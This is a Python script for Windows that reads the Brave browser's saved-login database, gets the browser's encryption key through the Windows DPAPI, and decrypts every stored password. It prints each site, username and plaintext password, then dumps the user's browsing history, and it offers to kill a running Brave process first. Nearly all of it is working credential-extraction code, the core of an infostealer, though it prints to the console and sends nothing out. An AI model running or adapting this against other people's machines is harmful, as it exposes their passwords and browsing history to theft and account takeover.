import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import psutil
from datetime import timezone, datetime, timedelta
import sys
import signal

pid=''

def Visited_Links():
    Hist_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
    temphist="Bravehistory.db"
    shutil.copyfile(Hist_path, temphist)

    # connecting to the database
    db = sqlite3.connect(temphist)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select url, title, visit_count,last_visit_time from urls "
        "order by last_visit_time")

    # iterate over all rows
    for row in cursor.fetchall():

        main_url = row[0]
        title = row[1]
        visit_count = row[2]
        last_visit_time = brave_date_and_time((row[3]))

        print(f"URL: {main_url}")
        print(f"Title: {title}")
        print(f"Visit Count: {visit_count}")
        print(f"Visit Time: {last_visit_time}")


def brave_date_and_time(brave_data):

    return datetime(1601, 1, 1) + timedelta(microseconds=brave_data)


def fetching_encryption_key():

    local_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser",
        "User Data", "Local State")

    with open(local_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def main():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    filename = "Bravebrowser.db"
    shutil.copyfile(db_path, filename)

    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            print(f"URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"User name: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(brave_date_and_time(date_of_creation))}")

        if last_usuage != 86400000000 and last_usuage:
            print(f"Last Used: {str(brave_date_and_time(last_usuage))}")
        print("=" * 100)
    cursor.close()
    db.close()

    try:

        # trying to remove the copied db file as
        # well from local computer
        os.remove(filename)
    except:
        pass


if __name__ == "__main__":
    if(sys.platform=='win32'):
        for proc in psutil.process_iter():
            if 'brave' in proc.name():
                pid = proc.pid
        #print (pid)
        if(pid):
            print("Brave is Running Do you want to Close press Y")
            prompt=input("Choice")
            if(prompt.lower()=='y'):
                os.kill(pid, signal.SIGTERM)
                main()
                print("**********VISITED LINKS*************"+"\n")
                Visited_Links()
        else:
            main()
            print("**********VISITED LINKS*************" + "\n")
            Visited_Links()
    else:
        print("Works for Windows platform only")
